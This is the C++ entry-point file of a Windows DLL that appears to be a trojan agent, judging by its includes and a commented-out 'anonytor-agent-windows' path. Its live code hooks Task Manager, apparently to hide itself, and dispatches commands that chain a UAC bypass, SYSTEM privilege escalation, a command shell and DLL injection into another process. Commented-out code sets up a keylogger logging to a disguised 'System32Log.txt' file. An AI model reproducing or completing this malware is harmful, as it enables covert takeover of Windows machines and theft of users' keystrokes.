// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

#include <winternl.h>
#include <shellapi.h>
#include <Shlobj_core.h>

#include "library.h"
#include "handlers/get_system.h"
#include "runtime/utils.h"
#include "handlers/keylog.h"
#include "handlers/uac_bypass.h"
#include "handlers/remote_dll_injection.h"
#include "handlers/taskmgr_hook.h"

HINSTANCE hInst = NULL;                                // 当前实例
wchar_t executable_path[MAX_PATH + 1];
wchar_t module_path[MAX_PATH + 1];
wchar_t* commandline;
bool stand_alone = false;
HINSTANCE hModule;

std::ofstream ofs;
bool file_opened;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        ::hModule = hModule;
        GetModuleFileName(NULL, executable_path, MAX_PATH);
        GetModuleFileName(hModule, module_path, MAX_PATH);
        wchar_t * tmp = lstrcat_heap(L"C:\\Windows\\System32\\rundll32.exe", module_path);
        commandline = lstrcat_heap(tmp, L",EntryPoint ");
        if (!_wcsicmp(executable_path, L"C:\\Windows\\System32\\rundll32.exe"))
        {
            MessageBox(0, L"Running", 0, 0);
            stand_alone = true;
        }
        else if (!_wcsicmp(executable_path, L"C:\\WINDOWS\\system32\\taskmgr.exe"))
        {
            StartHook();
        }
        else {
            MessageBox(0, L"Injected", 0, 0);
            MessageBox(0, executable_path, 0, 0);
            EntryPoint(NULL, NULL, "", 0);
        }
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        if (file_opened)
        {
            ofs.close();
        }
        break;
    }
    return TRUE;
}

extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCSTR lpszCmdLine, int nCmdShow)
{
    UNREFERENCED_PARAMETER(hwnd);
    UNREFERENCED_PARAMETER(nCmdShow);
    ::hInst = hinst; // 将实例句柄存储在全局变量中

    //elevate_execute((LPCWSTR)NULL, (LPWSTR)L"C:\\Windows\\System32\\cmd.exe");
    if (!strcmp(lpszCmdLine, "systemshell"))
    {
        MessageBox(0, L"systemshell", 0, 0);
        BypassUAC(L"getsystem");
        return;
    }
    else if (!strcmp(lpszCmdLine, "getsystem"))
    {
        MessageBox(0, L"getsystem", 0, 0);
        GetSystem(L"getshell");
        return;
    }
    else if (!strcmp(lpszCmdLine, "getshell"))
    {
        MessageBox(0, L"getshell", 0, 0);
        ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, SW_SHOWNORMAL);
        Sleep(10000);
        return;
    }
    else if (!strcmp(lpszCmdLine, "injecthide"))
    {
        MessageBox(0, L"injecthide", 0, 0);
        injectDll(12008, module_path);
        while (true) Sleep(1000);
        return;
    }


    //puts("hello, dll!");
    //::MessageBox(0, L"HELLO", 0, 0);
    //ConsoleInit();
    //printf("Hello!\n");
    //std::wcout << GetClipboardText() << std::endl;
    //std::cout << "hello!" << std::endl;
    //ofs.open("System32Log.txt");
    //RawInputKeyLogger.KeyLoggerInit(&ofs);
    //RawInputKeyLogger.KeyLoggerInit(&std::cout);

    //setReg();
    //EXE* head = NULL;
    //head = creatList();
    //printList(head);

    
    //elevate_self();
    //ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, SW_SHOWNORMAL);
    //while (true) Sleep(1000);
    
    //if (stand_alone)
    //{
    //    injectDll(16524, L"C:\\Users\\warren\\d\\torjan\\anonytor-agent-windows\\x64\\Debug\\anonytor-agent-windows.dll");
    //    MSG msg;
    //    while (GetMessage(&msg, nullptr, 0, 0))
    //    {
    //        TranslateMessage(&msg);
    //        DispatchMessage(&msg);
    //    }
    //}
    //else {
    //    // 注入explorer的时候咋
    //    LPWSTR path = NULL;
    //    HRESULT hr = SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DEFAULT, NULL, &path);
    //    if (!SUCCEEDED(hr)) {
    //        ErrorExit(L"SHGetKnownFolderPath Error");
    //    }
    //    LPWSTR file_path = lstrcat_heap(path, L"\\Temp\\System32Log.txt");
    //    std::wcout << file_path << std::endl;
    //    ofs.open("C:\\Users\\warren\\AppData\\Local\\Temp\\System32Log.txt");
    //    file_opened = true;
    //    RawInputKeyLogger.KeyLoggerInit(&ofs);
    //    //ofs << "hello?";
    //    //ofs.close();
    //    //while (true) Sleep(1000);
    //}


    //return;
}
